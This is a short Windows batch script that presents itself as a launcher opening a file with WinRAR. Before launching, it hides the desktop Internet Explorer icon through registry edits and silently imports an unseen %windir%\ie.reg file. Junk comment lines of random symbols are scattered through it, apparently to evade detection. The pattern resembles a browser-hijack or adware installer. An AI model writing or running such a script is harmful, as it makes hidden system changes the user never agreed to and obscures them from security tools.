@shift
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /f /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t REG_DWORD /d 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /f /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t REG_DWORD /d 1
::)&*@)(*#$()@*#$()*@#)($*)@*$)@*)$!@$u#()*%)*%)*_)@($
Regedit /s %windir%\ie.reg

::pie)(i*e)(if)uie)(*rwejowui)dr(*#)*r(ei
setlocal enabledelayedexpansion
::pie)(i*e)(if)uie)(*rwejowui)dr(*#)*r(ei
for /f "tokens=* delims= " %%i in ('reg query hkcr\.rar\shellnew^|findstr /i "filename"') do (
    set str=%%i
    set str1=!str:~0,-10!
    set str2=!str1:~16!
)
::uoru()#*$)@*($)(@*%(&^*(&#)*$)@*&)%(&^)
set path="!str2!winrar.exe"
%path% "%~1"
